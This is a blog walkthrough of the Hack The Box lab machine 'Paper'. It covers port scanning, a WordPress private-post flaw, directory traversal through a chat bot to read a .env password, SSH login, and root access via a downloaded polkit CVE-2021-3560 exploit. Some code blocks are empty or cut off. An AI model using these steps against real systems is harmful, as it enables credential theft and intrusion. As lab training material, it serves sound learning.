Hi folks, Hossam aka 0xGhaxy is here :)

in this blog, I'll explain how to exploit [Paper](https://app.hackthebox.com/machines/Paper). It's an easy Linux machine. machine by [secnigma](https://app.hackthebox.com/users/92926) if you wanna watch my walkthrough rather than writeup you can check my Youtube video.


## Table of content:
1. Enumeration
2. Gain Access
3. Privilege Escalation
4. Conclusion
5. What I have learned from this machine?

let's start now and Hack this machine :)

# [+] Enumeration

## Nmap

```bash
┌──(kali㉿kali)-[~/Desktop/Paper]
└─$ sudo nmap -T4 -p- 10.10.11.143
```

I used -p- switch to check all open TCP ports, and I get two open ports (22, 80, 443). Then I'll use -sC and -sV to get the result of default scripts and services versions respectively.

It's important to save your scan result because you may need it in the future, maybe you will be stuck at any point but when you take a deep breath and look again at the scan result you'll find a new way to continue in the machine or your bug bounty program. so I used -oN a switch to save the result in FullPaperNmapScan.txt file.

```bash
┌──(kali㉿kali)-[~/Desktop/Paper]
└─$ sudo nmap -T4 -sC -sV 10.10.11.143 -oN FullPaperNmapScan.txt

I tried to navigate to the target but found nothing useful there also using gobuster will produce nothing. so I tried to use Nikto a tool for enum this application.

## Nikto

```bash

```

I found that office.paper domain at x-backend-server section. so we need to add this domain to our hosts file using the following command.

```bash
┌──(kali㉿kali)-[~/Desktop/Paper]
└─$ sudo echo "10.10.11.143     office.paper" >> /etc/hosts
```

By navigating to the application we will find what there is an important post/hint "Felling Alone!".

![](https://user-images.githubusercontent.com/60070427/158587774-c4f9f147-5bba-40ee-a23c-59700ce5cb78.png)

there is hidden content in the blog. and it is powered by WordPress so I'll scan it using wpscan tool.

## wpscan

```bash
┌──(kali㉿kali)-[~/Desktop/my-files]

our target using an outdated version of WordPress. I searched for an exploit for this version and I found this result.

![](https://user-images.githubusercontent.com/60070427/158589365-119c1743-5591-45c3-acf0-2333218f0c13.png)


We will use WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts the exploit.

to see the secret content, our link will be like this: http://office.paper/?static=1/2021/06/19/feeling-alone/ and we find it :)

![](https://user-images.githubusercontent.com/60070427/158590428-fd8df660-2ccd-4c64-933e-5e0bb72acefe.png)

We find an interesting link:http://chat.office.paper/register/8qozr226AhkCHZdyY so we need to add the new domain to our host's file

```bash
┌──(kali㉿kali)-[~/Desktop/my-files]
└─$ sudo echo "10.10.11.143     chat.office.paper" >> /etc/hosts
```

now we can go and visit this link and we will find a registration form, and we will create an account there.

![](https://user-images.githubusercontent.com/60070427/158590887-8b10cb65-c560-4d39-818a-d8739b620241.png)

After registration, we wait for 1 minute and we will be added to a general chat. and we will find a bot called recyclops that provides us with some commands to ask. file = cat command and list = ls.

so we can text him and try to get some useful information.

![](https://user-images.githubusercontent.com/60070427/158606084-af331e3d-c15a-404c-9d02-02c05d467ea2.png)

After trying to list all available files it contains nothing useful so I try the Directory traversal concept by using list ../../ and it's valid in our machine :).

![](https://user-images.githubusercontent.com/60070427/158606081-9d1e451e-0a0e-4779-bd56-d2a05b7c6c20.png)


Now we know a username dwight on the paper machine, Let's try to get more valuable information.

![](https://user-images.githubusercontent.com/60070427/158606075-3ee293de-443e-4262-9810-3caf2ade6051.png)

I found an interesting directory hubot which may be the home directory for the recyclops bot. so I tried to view its content and I found that valuable information in the .env hidden file.

![](https://user-images.githubusercontent.com/60070427/158606072-ac927b95-0ddb-4651-a4ae-f78ee20319e1.png)

And finally, we get a password maybe-I'm from the future and I wanna say it's actually valid :)- it's valid in SSH. let's try to gain access to this machine 😎. 

```bash
┌──(kali㉿kali)-[~/Desktop/my-files]

Now let's try to read the user.txt file to get the user flag.

```bash
[dwight@paper ~]$ ls -la

```

# [+] Privilege Escalation

We have a user and need to get a root flag. if we try sudo -l we will get nothing useful.

so I'll try linpeas.sh. we send this script by scp command. First download linpeas script.

```bash
┌──(kali㉿kali)-[~/Desktop/my-files]
└─$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20220314/linpeas.sh

┌──(kali㉿kali)-[~/Desktop/my-files]
└─$ scp linpeas.sh dwight@office.paper:/home/dwight 
```

Then connect to it again and change its permissions if needed via SSH

```bash
[dwight@paper ~]$ chmod 777 lianpeas.sh
[dwight@paper ~]$ ./lianpeas.sh
```

![](https://user-images.githubusercontent.com/60070427/158610090-44cc4469-9154-460c-86b5-1585e1117f1d.png)

We will find that our target is vulnerable to CVE-2021-3560.

you can use this Python script or you can use the bash script in the Auther GitHub account "It all about enum :)".

![](https://user-images.githubusercontent.com/60070427/158610542-70c00f25-7cb4-41a9-942d-4988f297a096.PNG)

In my case, I'll use the Python script above by sending it to the target machine by scp or using wget.

```bash
[dwight@paper ~]$ wget https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py

# [+] Conclusion

First, we start with Nmap and find that we have open ports such as 80, 22, 443. if we try to gobuster our target we won't find any useful information and we'll be stuck there for a while. then I try Nikto to enum our target and I found office.paper the domain. and it's powered by WordPress so we'll scan it using wpscan and we'll get that our target using an outdated version that has a known exploit on the exploit database. then we get the hidden content of this blog and it helps us to reach the recyclops bot we use its functionality to gain more information from the server using directory traversal. to get the username and password from .env the file. and use this data to connect via SSH and scan our target using linpeas and get that our target is vulnerable to known CVE PolKit and we use this exploit to gain root access and submit the flag.

# [+] What i have learned from this machine?
- Try harder in the Enumeration stage.
- Take notes and save your scan results.
- If you are stuck read Machine forum for some help and hints such as:

Another important note, using linpeas won't make you a hacker. I used it because I'm a noob and it's my first machine - actually it's my first complete machine :)-. it's useful to try all possible techniques manually.
